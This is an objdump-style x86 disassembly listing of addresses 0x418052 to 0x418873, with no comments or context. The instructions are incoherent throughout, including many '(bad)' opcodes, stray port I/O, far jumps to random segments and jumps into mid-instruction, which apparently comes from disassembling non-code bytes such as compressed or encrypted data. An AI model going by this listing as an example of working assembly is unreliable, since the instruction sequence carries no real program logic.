  418052:	mov    DWORD PTR [ebp-0x6a9fa9f0],eax
  418058:	xchg   edi,eax
  418059:	adc    al,0xa1
  41805b:	cmp    BYTE PTR [ebx],dh
  41805d:	callw  0x79ff
  418061:	ret    0x5d22
  418064:	or     eax,0x187fe5db
  418069:	jb     0x41805a
  41806b:	push   0x3aca8966
  418070:	pusha  
  418071:	pop    esp
  418072:	aad    0x78
  418074:	adc    BYTE PTR [eax-0x4e0b9ebc],ah
  41807a:	dec    esp
  41807b:	call   0xe7945588
  418080:	or     DWORD PTR [eax-0x3dade2be],0x5
  418087:	jecxz  0x418011
  418089:	mov    al,0x8
  41808b:	push   esi
  41808c:	(bad)  
  41808d:	aas    
  41808e:	jae    0x41804b
  418090:	cmp    BYTE PTR [edi*1-0x32377d19],bl
  418097:	jb     0x41803b
  418099:	sub    DWORD PTR [ecx],edi
  41809b:	sbb    al,0x7e
  41809d:	mov    cl,0xe7
  41809f:	xchg   ax,ax
  4180a1:	add    ebx,DWORD PTR es:[edx]
  4180a4:	fnstsw WORD PTR [ebx-0x75]
  4180a7:	sub    ah,BYTE PTR [ebp+eiz*8-0x411e17bd]
  4180ae:	sub    eax,DWORD PTR [edi]
  4180b0:	jns    0x418094
  4180b2:	sbb    eax,0xeec9bfd2
  4180b7:	or     al,0xed
  4180b9:	pop    ebp
  4180ba:	sub    al,0x5d
  4180bc:	sbb    edx,DWORD PTR [ebx]
  4180be:	sub    BYTE PTR [ebp-0x14],ch
  4180c1:	sub    al,bl
  4180c3:	jmp    0x41810a
  4180c5:	adc    DWORD PTR [edi+0xa7417f2],edx
  4180cb:	xchg   edi,eax
  4180cc:	sbb    edi,esp
  4180ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cf:	rcr    BYTE PTR [ecx+0x6e],1
  4180d2:	test   eax,0x70a8f15a
  4180d7:	sub    al,0xb2
  4180d9:	hlt    
  4180da:	imul   ecx,DWORD PTR [bx+0x37],0x5c87edd9
  4180e2:	mov    ch,0x70
  4180e4:	push   edi
  4180e5:	in     eax,0x2a
  4180e7:	or     DWORD PTR [edi-0x31b493af],edi
  4180ed:	push   ebp
  4180ee:	cdq    
  4180ef:	ret    0x6cdf
  4180f2:	stc    
  4180f3:	sbb    al,0xa9
  4180f5:	out    dx,al
  4180f6:	adc    ebx,DWORD PTR [edi+eax*4+0x39516379]
  4180fd:	jmp    0x61dfc66e
  418102:	es loopne 0x4180d3
  418105:	jmp    DWORD PTR ds:0x3b9b96ef
  41810b:	mov    edx,0xbf8af793
  418110:	les    esi,FWORD PTR [ebp-0x28380781]
  418116:	add    DWORD PTR [edx],esi
  418118:	cmp    BYTE PTR [edx-0x48],ah
  41811b:	inc    ebp
  41811c:	adc    bh,cl
  41811e:	enter  0x7c23,0xe9
  418122:	add    esi,DWORD PTR [edi]
  418124:	push   esi
  418125:	int    0xcd
  418127:	jo     0x4180bb
  418129:	ret    0xbec1
  41812c:	icebp  
  41812d:	jb     0x418163
  41812f:	ss retf 
  418131:	outs   dx,DWORD PTR ds:[esi]
  418132:	ss jns 0x4180fd
  418135:	fld    TBYTE PTR [esp+esi*4-0x52]
  418139:	retf   
  41813a:	lahf   
  41813b:	lods   eax,DWORD PTR ds:[esi]
  41813c:	aad    0xe3
  41813e:	imul   BYTE PTR [edx-0x2a]
  418141:	retf   
  418142:	cs fsubr st,st(1)
  418145:	sbb    eax,DWORD PTR [ecx+0x1d]
  418148:	inc    ebp
  418149:	jmp    0x4180ff
  41814b:	mov    cl,bh
  41814d:	cli    
  41814e:	pop    eax
  41814f:	mov    ebx,DWORD PTR [edx+0xdf47efe]
  418155:	in     al,0xde
  418157:	add    eax,0x941110c7
  41815c:	push   0xda8621b7
  418161:	test   al,0x3d
  418163:	xor    ecx,DWORD PTR [ebp+0x65]
  418166:	dec    ebx
  418167:	add    eax,0xe20df283
  41816c:	test   eax,0x1620300e
  418171:	lods   eax,DWORD PTR ds:[esi]
  418172:	or     DWORD PTR [ecx],0xffffffa9
  418175:	idiv   BYTE PTR [ebx-0x77]
  418178:	cmp    bh,BYTE PTR [edi]
  41817a:	sbb    eax,DWORD PTR [ecx-0x3e57b6c2]
  418180:	popf   
  418181:	inc    ebp
  418182:	fadd   st,st(2)
  418184:	xor    BYTE PTR [ebx-0x6e756f4c],al
  41818a:	pusha  
  41818b:	rcl    DWORD PTR [ebp+0x64eb6f7d],0x15
  418192:	lds    ebx,FWORD PTR [ecx+0x3a]
  418195:	xchg   esp,eax
  418196:	jmp    0xe56d:0xe82132eb
  41819d:	cmp    al,0xfa
  41819f:	mov    dh,0x7b
  4181a1:	call   0xa1b229c0
  4181a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181a7:	mov    ds,WORD PTR [eax-0x54]
  4181aa:	js     0x418192
  4181ac:	push   ds
  4181ad:	mov    BYTE PTR [ecx-0x45b2f47d],dh
  4181b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181b4:	out    dx,al
  4181b5:	cmp    BYTE PTR [ecx],0x51
  4181b8:	cmova  ebp,esi
  4181bb:	xor    DWORD PTR [edi+0x4e],0xb1dc3cd9
  4181c2:	dec    edx
  4181c3:	push   ebp
  4181c4:	add    BYTE PTR [ebx+ebx*8+0x59af5a5d],ah
  4181cb:	or     edi,DWORD PTR [ebx+ebp*8+0x7b0e0c0]
  4181d2:	fs jge 0x41817b
  4181d5:	(bad)  
  4181d7:	in     al,0xff
  4181d9:	sbb    BYTE PTR [ebx],bl
  4181db:	out    0xd4,eax
  4181dd:	js     0x418223
  4181df:	test   edi,ebp
  4181e1:	test   eax,0x476aa23
  4181e6:	test   BYTE PTR [eax+0x79],ch
  4181e9:	ret    0x628d
  4181ec:	sti    
  4181ed:	jg     0x418180
  4181ef:	and    al,BYTE PTR ds:0x8e85298f
  4181f5:	add    al,0xcf
  4181f7:	sbb    esp,ebx
  4181f9:	aad    0xcf
  4181fb:	lods   al,BYTE PTR ds:[esi]
  4181fc:	or     DWORD PTR [edi+0x27],0x9c61dd3
  418203:	sub    eax,0x85b0a082
  418208:	and    DWORD PTR [edx-0x48256056],esp
  41820e:	test   DWORD PTR [edi+0x3d13c6f1],eax
  418214:	popa   
  418215:	pandn  mm7,mm3
  418218:	fwait
  418219:	and    cl,BYTE PTR [esi+0x25dc0959]
  41821f:	mov    al,ds:0xbdd59dd5
  418224:	rcl    DWORD PTR [edx-0x1b15c94c],0xc3
  41822b:	in     eax,0xc4
  41822d:	inc    ecx
  41822e:	aad    0x34
  418230:	and    DWORD PTR [ebp+0x5],edi
  418233:	push   esp
  418234:	call   ebp
  418236:	inc    esi
  418237:	les    eax,FWORD PTR [esi-0x1ae05a1f]
  41823d:	sub    ah,ch
  41823f:	leave  
  418240:	fcmovnbe st,st(6)
  418242:	int    0x2d
  418244:	out    dx,al
  418245:	jo     0x418276
  418247:	add    DWORD PTR [ebx],0x41
  41824a:	sub    al,BYTE PTR [edx]
  41824c:	sub    al,0x76
  41824e:	lods   al,BYTE PTR ds:[esi]
  41824f:	push   es
  418250:	xchg   edx,eax
  418251:	lds    ebx,FWORD PTR [edi]
  418253:	test   BYTE PTR [edx],al
  418255:	lods   al,BYTE PTR ds:[esi]
  418256:	add    BYTE PTR [edi+0x3],bl
  418259:	stos   BYTE PTR es:[edi],al
  41825a:	adc    dh,dl
  41825c:	outs   dx,BYTE PTR ds:[esi]
  41825d:	inc    ebp
  41825e:	push   edx
  41825f:	sahf   
  418260:	js     0x418273
  418262:	stc    
  418263:	pop    esi
  418264:	pop    eax
  418265:	add    ah,BYTE PTR ds:0x2f75dea2
  41826b:	push   es
  41826c:	frstor [ecx+0x29]
  41826f:	push   cs
  418270:	adc    al,BYTE PTR [ebp+0x5c]
  418273:	or     DWORD PTR [ebx-0x7f3b0b46],eax
  418279:	push   ebx
  41827a:	test   BYTE PTR [ecx+ebp*8+0x75061d75],cl
  418281:	push   ebx
  418282:	data16 xor BYTE PTR [ebx+edi*1],dh
  418286:	and    esp,ebx
  418288:	sbb    eax,0x354d0304
  41828d:	mov    ah,0x42
  41828f:	dec    esi
  418290:	mov    WORD PTR [edi],fs
  418292:	xchg   ebx,eax
  418293:	add    al,0x62
  418295:	cs mov ebp,0x130926aa
  41829b:	mov    edi,0xa1b35f78
  4182a0:	mov    ds:0x439cefba,al
  4182a5:	or     edx,ebp
  4182a7:	mov    ebx,0xc928f9f7
  4182ac:	or     BYTE PTR [ebx-0x41b3fe56],dl
  4182b2:	imul   esp,DWORD PTR [ebx],0x7065e8f6
  4182b8:	mov    dl,ah
  4182ba:	retf   0xb3c2
  4182bd:	je     0x41828f
  4182bf:	push   0x7b8c109f
  4182c4:	jge    0x4182da
  4182c6:	jae    0x418337
  4182c8:	out    dx,eax
  4182c9:	pop    esi
  4182ca:	gs or  eax,0xc63762b4
  4182d0:	cmp    ah,BYTE PTR [edi+0x1b]
  4182d3:	mov    ebp,0x22cd948c
  4182d8:	dec    edi
  4182d9:	data16 mov bl,0x7a
  4182dc:	pop    es
  4182dd:	jns    0x4182aa
  4182df:	pop    eax
  4182e0:	stc    
  4182e1:	es jb  0x4182b9
  4182e4:	inc    ebx
  4182e5:	sub    ebx,DWORD PTR [edx-0x1b]
  4182e8:	ja     0x418365
  4182ea:	int    0x1b
  4182ec:	sub    bh,bh
  4182ee:	jmp    FWORD PTR [ebx-0x473b35de]
  4182f4:	test   al,0x6b
  4182f6:	repnz out 0x44,eax
  4182f9:	or     cl,BYTE PTR [ebp-0x7983cf61]
  4182ff:	out    dx,al
  418300:	inc    eax
  418301:	loop   0x418319
  418303:	xor    BYTE PTR ds:0x240912df,ah
  418309:	mov    bh,0x16
  41830b:	xlat   BYTE PTR ds:[ebx]
  41830c:	mov    DWORD PTR [edi+0x727296ab],ecx
  418312:	pop    ebx
  418313:	mov    cl,0xb8
  418315:	sar    eax,cl
  418317:	or     BYTE PTR [esi],ch
  418319:	loop   0x418399
  41831b:	lods   al,BYTE PTR ds:[esi]
  41831c:	sub    ecx,DWORD PTR [ecx]
  41831e:	sbb    DWORD PTR [ebx+0x35],0x80d82de
  418325:	or     al,BYTE PTR [ebx+0x5f]
  418328:	in     eax,0xe9
  41832a:	sbb    ch,BYTE PTR [esi+eiz*4+0x4bfd1fe6]
  418331:	sbb    al,0x76
  418333:	sub    dh,al
  418335:	cdq    
  418336:	cmp    al,0x76
  418338:	sub    BYTE PTR [esi-0x14e56065],bh
  41833e:	mov    bh,0x24
  418340:	jno    0x418395
  418342:	mov    dh,0xbc
  418344:	or     DWORD PTR [eax-0x44],0x16cdcb9e
  41834b:	fdivr  st,st(2)
  41834d:	mov    BYTE PTR [edx],bh
  41834f:	pop    esi
  418350:	sbb    DWORD PTR [edx],edi
  418352:	adc    cl,BYTE PTR [edx+0x53704aa]
  418358:	call   0x93deabc2
  41835d:	or     bh,BYTE PTR [edi-0x45]
  418360:	int    0xea
  418362:	sub    edi,DWORD PTR [ebx]
  418364:	sub    DWORD PTR [eax],0xffffffa9
  418367:	mov    eax,ds:0x98de596b
  41836c:	jbe    0x4183a5
  41836e:	lds    esi,FWORD PTR [bp+di]
  418371:	mov    BYTE PTR [edi],dh
  418373:	pop    es
  418374:	mov    bh,0x1c
  418376:	cmp    DWORD PTR [ebp+0x56c71883],0x77
  41837d:	sbb    al,0x65
  41837f:	adc    dh,bl
  418381:	mov    al,ds:0x66a96eb2
  418386:	popf   
  418387:	xor    BYTE PTR [edi+0xb781706],bl
  41838d:	shr    BYTE PTR [edx-0x6d],0xfa
  418391:	mov    al,0x15
  418393:	xchg   ebx,eax
  418394:	imul   esi,DWORD PTR [edi+0x69],0xffffffed
  418398:	jnp    0x41833a
  41839a:	fistp  WORD PTR [edx+0x43]
  41839d:	xor    BYTE PTR ds:0x54172f91,dl
  4183a3:	xlat   BYTE PTR ds:[ebx]
  4183a4:	mov    ebx,0x87d8bf92
  4183a9:	and    BYTE PTR ds:0x38011659,0x49
  4183b0:	xor    bl,ch
  4183b2:	in     al,dx
  4183b3:	inc    eax
  4183b4:	dec    esp
  4183b5:	push   0xffffffe4
  4183b7:	add    ah,ch
  4183b9:	and    DWORD PTR [eax+0xc],esi
  4183bc:	pop    ebp
  4183bd:	or     al,0x1f
  4183bf:	pop    ds
  4183c0:	add    BYTE PTR [edi-0x6e420b4],cl
  4183c6:	aaa    
  4183c7:	xlat   BYTE PTR ds:[ebx]
  4183c8:	push   eax
  4183c9:	clc    
  4183ca:	mov    ebp,0xfe6b3d7e
  4183cf:	dec    esp
  4183d0:	add    ebx,DWORD PTR [edx+0x6]
  4183d3:	fimul  WORD PTR [edx-0x55]
  4183d6:	xchg   bl,bh
  4183d8:	hlt    
  4183d9:	inc    esp
  4183da:	rol    BYTE PTR [edi-0x27c969d0],1
  4183e0:	push   ecx
  4183e1:	pop    ds
  4183e2:	adc    al,0x67
  4183e4:	fsub   DWORD PTR [esi-0x5f]
  4183e7:	push   esp
  4183e8:	loop   0x41845e
  4183ea:	pop    ss
  4183eb:	pop    edx
  4183ec:	or     BYTE PTR [ecx],al
  4183ee:	dec    esp
  4183ef:	sub    BYTE PTR [esi],0xa5
  4183f2:	inc    ecx
  4183f3:	sub    ebx,ecx
  4183f5:	scas   eax,DWORD PTR es:[edi]
  4183f6:	aad    0xb
  4183f8:	rcr    BYTE PTR [esi-0x5c],1
  4183fb:	jnp    0x41845c
  4183fd:	jle    0x4183bc
  4183ff:	and    ebx,DWORD PTR [edi+0x12]
  418402:	popf   
  418403:	inc    DWORD PTR [edx+0x31]
  418406:	xor    edi,DWORD PTR [ebp+esi*1-0x76]
  41840a:	push   cs
  41840b:	or     BYTE PTR [edi+0x69],0x93
  41840f:	fcom   st(2)
  418411:	sub    cl,BYTE PTR [ecx-0x37aeb7f7]
  418417:	cli    
  418418:	jns    0x418456
  41841a:	dec    ecx
  41841b:	ret    
  41841c:	mov    ecx,0xe4cd00c2
  418421:	mov    bh,0x8a
  418423:	sub    al,0x49
  418425:	js     0x4183f3
  418427:	inc    ecx
  418428:	mov    edi,0x18b65a35
  41842d:	arpl   sp,dx
  41842f:	and    dl,BYTE PTR [ebx]
  418431:	sbb    edx,DWORD PTR [ebx-0x55b363d5]
  418437:	stc    
  418438:	jmp    0x8883fa4c
  41843d:	or     eax,0x704a8bf4
  418442:	ret    
  418443:	pusha  
  418444:	or     cl,BYTE PTR [ebp-0x6e]
  418447:	xor    ebx,edi
  418449:	js     0x418465
  41844b:	jae    0x418443
  41844d:	sahf   
  41844e:	js     0x418455
  418450:	js     0x4184a0
  418452:	mov    bh,0x54
  418454:	mov    al,ds:0xf6c398b8
  418459:	lea    esp,[ebx+0x4706bb15]
  41845f:	test   eax,0x6ad6a5dd
  418464:	fistp  DWORD PTR [eax+0x7028bc95]
  41846a:	loopne 0x4184d8
  41846c:	add    eax,esi
  41846e:	jle    0x4184d6
  418470:	daa    
  418471:	in     al,0x65
  418473:	dec    esp
  418474:	push   esp
  418475:	dec    esi
  418476:	adc    dl,BYTE PTR [edi+0x73]
  418479:	sbb    ebp,DWORD PTR [edx+ecx*4]
  41847c:	cmp    eax,0x8051015
  418481:	arpl   WORD PTR [ebx-0x3f23dc1f],sp
  418487:	frstpm(287 only) 
  418489:	mov    cl,0x4a
  41848b:	adc    edi,0x6f
  41848e:	ret    
  41848f:	ret    0x99d0
  418492:	mov    ds:0xde24c7a6,eax
  418497:	mov    ebx,DWORD PTR [edx]
  418499:	jg     0x418435
  41849b:	mov    ebx,0x7d08195f
  4184a0:	cmc    
  4184a1:	push   edx
  4184a2:	mov    WORD PTR [ecx+0x32],fs
  4184a5:	push   es
  4184a6:	stos   DWORD PTR es:[edi],eax
  4184a7:	xchg   ecx,eax
  4184a8:	data16 sbb BYTE PTR [esi-0x76cdb6ad],cl
  4184af:	rol    BYTE PTR [ecx+eax*4],cl
  4184b2:	pop    ecx
  4184b3:	jb     0x41844f
  4184b5:	in     al,0x9a
  4184b7:	mov    ebp,edi
  4184b9:	loop   0x4184ca
  4184bb:	pop    edx
  4184bc:	imul   ecx,DWORD PTR [edx],0xbc9dab30
  4184c2:	repz mov ebp,0xa5d3aa53
  4184c8:	in     al,0xf4
  4184ca:	imul   esp,DWORD PTR [ebx-0x12e06f25],0x4f
  4184d1:	or     BYTE PTR [edx-0x3b7d25de],al
  4184d7:	dec    ebx
  4184d8:	stos   DWORD PTR es:[edi],eax
  4184d9:	(bad)  
  4184da:	jnp    0x4184a5
  4184dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184dd:	xchg   ebp,eax
  4184de:	mov    ss:0x89b3c63e,al
  4184e4:	adc    esp,DWORD PTR [esi-0x21]
  4184e7:	mov    eax,esp
  4184e9:	ds mov eax,0x7e1dd97d
  4184ef:	add    al,0xd5
  4184f1:	mov    DWORD PTR [ebp+0x5739f249],0x5038437b
  4184fb:	(bad)  
  4184fc:	push   ss
  4184fd:	adc    cl,BYTE PTR [ebp+0x346816ae]
  418503:	push   0xffffff8c
  418505:	dec    ebp
  418506:	test   al,0x9
  418508:	and    dh,dl
  41850a:	mov    cl,0x6d
  41850c:	pushf  
  41850d:	ds dec edi
  41850f:	push   ss
  418510:	adc    cl,BYTE PTR [ebx+0x602da375]
  418516:	loop   0x4184eb
  418518:	movq   mm1,mm6
  41851b:	fistp  WORD PTR [ecx+0x5]
  41851e:	je     0x418511
  418520:	out    dx,eax
  418521:	push   edx
  418522:	adc    al,0x4e
  418524:	repz adc esp,DWORD PTR [ecx]
  418527:	mov    cs,WORD PTR [eax]
  418529:	imul   ecx,DWORD PTR [edi],0xffffffb5
  41852c:	gs dec eax
  41852e:	sub    dh,bh
  418530:	aad    0x58
  418532:	xchg   DWORD PTR [edi+0x1f14e5dd],ebp
  418538:	jmp    0xa8ee:0xe779c135
  41853f:	xlat   BYTE PTR ds:[ebx]
  418540:	(bad)  
  418541:	jne    0x41856f
  418543:	jnp    0x4184cd
  418545:	ret    0x3c2b
  418548:	push   ebx
  418549:	sti    
  41854a:	push   0x53348469
  41854f:	ss mov cl,0x29
  418552:	mov    dl,0xdb
  418554:	fldcw  WORD PTR [ecx-0x10b77896]
  41855a:	(bad)  
  41855c:	mov    eax,ds:0xefb60a20
  418561:	xchg   esi,eax
  418562:	jbe    0x418589
  418564:	mov    ebp,DWORD PTR [esi-0x7f]
  418567:	xchg   ebx,eax
  418568:	call   0x7712:0xf6558b08
  41856f:	jo     0x4185cb
  418571:	icebp  
  418572:	xchg   esp,eax
  418573:	sub    eax,0x47bc8f46
  418578:	std    
  418579:	mov    esi,0xe5b138ac
  41857e:	xor    eax,0xc6a6151d
  418583:	add    eax,0xa2bbdf2e
  418588:	retf   
  418589:	mov    eax,0x9631f1d8
  41858e:	sub    DWORD PTR [ebp+0x29],eax
  418591:	sbb    DWORD PTR [ebx+0x61f70265],edx
  418597:	icebp  
  418598:	jns    0x418563
  41859a:	and    BYTE PTR [eax+0x36776025],0x1a
  4185a1:	add    ah,BYTE PTR [esi+edx*1+0x64f622e4]
  4185a8:	add    al,0xbe
  4185aa:	mov    ecx,0x57ac11a
  4185af:	mov    edx,0xeceb63cf
  4185b4:	mov    ds:0x2031861b,eax
  4185b9:	pop    edi
  4185ba:	ins    BYTE PTR es:[edi],dx
  4185bb:	cwde   
  4185bc:	mov    dl,0xa4
  4185be:	pop    ebp
  4185bf:	sbb    bh,0xd6
  4185c2:	sub    ebp,esp
  4185c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c5:	icebp  
  4185c6:	xor    eax,edi
  4185c8:	xbegin 0xd722fe2a
  4185ce:	xchg   ebx,eax
  4185cf:	(bad)  
  4185d0:	add    DWORD PTR [edx+0x5dc4f614],0xc03800e8
  4185da:	sahf   
  4185db:	jl     0x41856f
  4185dd:	mov    dh,0x96
  4185df:	jne    0x4185b7
  4185e1:	pushf  
  4185e2:	mov    DWORD PTR ds:0x934d2892,edx
  4185e8:	mov    ds:0xe598852b,al
  4185ed:	inc    eax
  4185ee:	push   ds
  4185ef:	shr    BYTE PTR [esi],0x5
  4185f2:	jo     0x41862c
  4185f4:	stc    
  4185f5:	xor    DWORD PTR [edx-0x534af3e3],ebp
  4185fb:	xor    al,0xe
  4185fd:	(bad)  
  4185fe:	das    
  4185ff:	imul   ebx,ebp,0x6f40c0cc
  418605:	mov    ah,0xfa
  418607:	dec    ebx
  418608:	aaa    
  418609:	retf   0x580f
  41860c:	pop    edi
  41860d:	fdivr  DWORD PTR gs:[ebx+edx*1+0x57]
  418612:	daa    
  418613:	fidiv  WORD PTR [esi+ebp*4-0x61]
  418617:	and    dl,dl
  418619:	out    0x8e,al
  41861b:	mov    al,0x38
  41861d:	inc    eax
  41861e:	call   0xafb0:0xd777efb1
  418625:	jl     0x4185b5
  418627:	and    cl,0x21
  41862a:	das    
  41862b:	sbb    dl,ch
  41862d:	scas   eax,DWORD PTR es:[edi]
  41862e:	fs mov bh,0x1c
  418631:	mov    bl,0x31
  418633:	inc    edx
  418634:	ins    BYTE PTR es:[edi],dx
  418635:	out    0x3e,al
  418637:	bound  eax,QWORD PTR [ecx+0x62]
  41863a:	loopne 0x418652
  41863c:	jge    0x418619
  41863e:	clc    
  41863f:	jns    0x41869e
  418641:	daa    
  418642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418643:	in     eax,0x7c
  418645:	ja     0x418699
  418647:	pop    edi
  418648:	fldcw  WORD PTR [edi]
  41864a:	loopne 0x41860e
  41864c:	or     al,0xb0
  41864e:	sbb    edx,DWORD PTR [eax+0x63]
  418651:	push   cs
  418652:	fcmovnu st,st(5)
  418654:	fwait
  418655:	daa    
  418656:	imul   esp,DWORD PTR [esi+edi*2-0x1edc826d],0x47
  41865e:	retf   0xfb9a
  418661:	sbb    edx,DWORD PTR [ebx]
  418663:	outs   dx,BYTE PTR ds:[esi]
  418664:	sub    esi,DWORD PTR [edi-0x2]
  418667:	and    DWORD PTR [eax],esi
  418669:	push   edi
  41866a:	rol    BYTE PTR [esi+0x197ab481],0x91
  418671:	pop    esi
  418672:	inc    edx
  418673:	xchg   esp,eax
  418674:	dec    ebx
  418675:	xchg   ebp,eax
  418676:	jge    0x418688
  418678:	inc    edi
  418679:	mov    ecx,DWORD PTR [ecx]
  41867b:	jbe    0x418630
  41867d:	pop    ebp
  41867e:	and    ah,BYTE PTR [ebp-0x786a2b9]
  418684:	fcmovnu st,st(6)
  418686:	fcom   st(3)
  418688:	fwait
  418689:	dec    edx
  41868a:	in     al,0xb7
  41868c:	fcmove st,st(7)
  41868e:	in     eax,dx
  41868f:	dec    edi
  418690:	ror    BYTE PTR [esi],1
  418692:	leave  
  418693:	push   ebx
  418694:	or     eax,0x8a27ac06
  418699:	inc    esp
  41869a:	popa   
  41869b:	lods   eax,DWORD PTR ss:[esi]
  41869d:	mov    bl,0xbf
  41869f:	test   BYTE PTR fs:[ecx-0x3],ah
  4186a3:	dec    ecx
  4186a4:	push   ebp
  4186a5:	scas   eax,DWORD PTR es:[edi]
  4186a6:	(bad)
  4186aa:	mov    al,0x1d
  4186ac:	mov    esi,0x16a59dc
  4186b1:	and    ah,BYTE PTR [ecx+0xf]
  4186b4:	outs   dx,DWORD PTR ds:[esi]
  4186b5:	jb     0x418732
  4186b7:	jmp    0x8d83:0xcc829c1f
  4186be:	cs push esi
  4186c0:	mov    eax,ds:0x2d95cb50
  4186c5:	std    
  4186c6:	or     DWORD PTR [ecx+0x7c],edx
  4186c9:	jle    0x41871c
  4186cb:	jmp    0x3c2b:0x91fd7f58
  4186d2:	pop    edx
  4186d3:	push   cs
  4186d4:	jle    0x418683
  4186d6:	xchg   ecx,eax
  4186d7:	xchg   esp,eax
  4186d8:	call   FWORD PTR [edi-0x49ee994e]
  4186de:	cdq    
  4186df:	loope  0x4186e9
  4186e1:	int    0xc8
  4186e3:	jns    0x41871d
  4186e5:	ja     0x4186ca
  4186e7:	pop    es
  4186e8:	mov    ds:0x53c4f6e7,eax
  4186ed:	mov    ds:0x24980fab,al
  4186f2:	dec    esi
  4186f3:	xchg   edi,eax
  4186f4:	mov    ah,0xcb
  4186f6:	dec    ebp
  4186f7:	in     al,dx
  4186f8:	lods   al,BYTE PTR ds:[esi]
  4186f9:	das    
  4186fa:	and    eax,0x17297917
  4186ff:	xor    al,0xb8
  418701:	outs   dx,DWORD PTR ds:[esi]
  418702:	adc    al,0x14
  418704:	xor    BYTE PTR ds:0xe1e276fb,0xd9
  41870b:	js     0x4186ba
  41870d:	in     al,0xa8
  41870f:	xor    BYTE PTR [ecx-0x7d],dl
  418712:	mov    ch,0xe4
  418714:	stos   DWORD PTR es:[edi],eax
  418715:	adc    al,al
  418717:	xchg   esi,eax
  418718:	xor    eax,edi
  41871a:	mov    edx,0x17636cf
  418720:	in     eax,0x30
  418722:	outs   dx,DWORD PTR ds:[esi]
  418723:	cwde   
  418724:	leave  
  418725:	push   ss
  418726:	pop    eax
  418727:	mov    BYTE PTR gs:[esi+0x28],bh
  41872b:	test   al,0x8a
  41872d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41872e:	push   esi
  41872f:	cli    
  418730:	lods   eax,DWORD PTR ds:[esi]
  418731:	hlt    
  418732:	inc    edx
  418733:	mov    cl,0x7b
  418735:	sub    ch,ch
  418737:	sub    eax,edi
  418739:	div    BYTE PTR [eax]
  41873b:	shl    esp,0x73
  41873e:	push   cs
  41873f:	int3   
  418740:	mov    edx,0x8916d253
  418745:	into   
  418746:	clc    
  418747:	sub    BYTE PTR [esi],dl
  418749:	jo     0x4187a3
  41874b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41874c:	add    BYTE PTR ds:0x146fea45,0x38
  418753:	(bad)  
  418754:	arpl   dx,di
  418756:	mov    al,ds:0x66e3b8c4
  41875b:	push   edx
  41875c:	in     al,dx
  41875d:	push   ss
  41875e:	add    BYTE PTR [si-0x41d6],0x4e
  418764:	push   ebx
  418765:	(bad)  
  418766:	xchg   ecx,eax
  418767:	enter  0xdff5,0x7a
  41876b:	pushf  
  41876c:	xor    dh,bl
  41876e:	xor    DWORD PTR [edx+esi*1-0x1a344f3d],0xf1ffa630
  418779:	fdivr  st,st(4)
  41877b:	pop    edi
  41877c:	repnz and esp,edi
  41877f:	jb     0x41870e
  418781:	pop    eax
  418782:	loopne 0x418731
  418784:	jns    0x41872c
  418786:	test   DWORD PTR [eax],ebx
  418788:	fisttp QWORD PTR [edx-0x68bb00a3]
  41878e:	test   bl,dl
  418790:	mov    ds:0x623c6583,al
  418795:	jp     0x4187c0
  418797:	push   cs
  418798:	xchg   edi,eax
  418799:	dec    esp
  41879a:	jle    0x418779
  41879c:	inc    ecx
  41879d:	stos   DWORD PTR es:[edi],eax
  41879e:	and    eax,0xb0510a4c
  4187a3:	mov    ecx,DWORD PTR [ebx+0x6f463572]
  4187a9:	dec    esp
  4187aa:	in     al,dx
  4187ab:	mov    edx,0x8391f152
  4187b0:	or     ebp,DWORD PTR [ebx+0x45b2d7b1]
  4187b6:	adc    eax,0x731d0864
  4187bb:	sbb    eax,0x5a73789b
  4187c0:	ds (bad) 
  4187c2:	pop    esp
  4187c3:	jae    0x4187f1
  4187c5:	dec    edx
  4187c6:	jge    0x418785
  4187c8:	es dec ebp
  4187ca:	pop    ebx
  4187cb:	icebp  
  4187cc:	(bad)  
  4187cd:	cld    
  4187ce:	popa   
  4187cf:	pop    ebp
  4187d0:	loope  0x418814
  4187d2:	mov    eax,0xc8fd07ac
  4187d7:	aaa    
  4187d8:	mov    al,ds:0xccc44d9d
  4187dd:	jbe    0x418852
  4187df:	cs cli 
  4187e1:	les    esi,FWORD PTR cs:[ebx]
  4187e4:	sahf   
  4187e5:	into   
  4187e6:	push   ds
  4187e7:	out    dx,eax
  4187e8:	into   
  4187e9:	mul    edx
  4187eb:	mov    al,ds:0xd4861976
  4187f0:	mov    ch,0x3b
  4187f2:	lea    esp,[eax]
  4187f4:	ror    ebp,0xdd
  4187f7:	fcmovu st,st(4)
  4187f9:	push   esp
  4187fa:	(bad)  
  4187fb:	jge    0x418852
  4187fd:	loope  0x41887e
  4187ff:	add    dh,BYTE PTR [ebp-0x3c719168]
  418805:	mov    eax,0x482433ae
  41880a:	scas   al,BYTE PTR es:[edi]
  41880b:	jb     0x418793
  41880d:	xor    DWORD PTR [eax],ebp
  41880f:	xchg   edx,eax
  418810:	std    
  418811:	and    bh,BYTE PTR [ebp+0x36bda6a8]
  418817:	push   0x400cc51d
  41881c:	add    esi,DWORD PTR [esi+ebp*4+0x5]
  418820:	retf   0xf1bb
  418823:	icebp  
  418824:	mov    ch,0x5e
  418826:	push   eax
  418827:	out    dx,al
  418828:	shl    dh,cl
  41882a:	mov    eax,0xc9e368cb
  41882f:	jg     0x418821
  418831:	jmp    0x418848
  418833:	in     al,0x65
  418835:	adc    al,0x7f
  418837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418838:	mov    bh,0x94
  41883a:	arpl   WORD PTR [ecx+0x3342bfe7],cx
  418840:	out    0x62,eax
  418842:	test   al,0x7d
  418844:	push   edi
  418845:	inc    ecx
  418846:	dec    edx
  418847:	ds sub al,0x58
  41884a:	in     al,dx
  41884b:	jns    0x4188c0
  41884d:	ins    BYTE PTR es:[edi],dx
  41884e:	out    dx,eax
  41884f:	shl    DWORD PTR [eax+ecx*8+0x5c735fed],0x85
  418857:	call   0xa4f6:0xef279ac0
  41885e:	push   0x8260ebb
  418863:	adc    edx,edi
  418865:	out    0x6d,eax
  418867:	xor    esp,edi
  418869:	xor    BYTE PTR [ebp-0x50],dl
  41886c:	mov    cl,0x3c
  41886e:	push   esp
  41886f:	adc    al,0x6f
  418871:	pop    ebp
  418872:	dec    ecx
  418873:	leave  
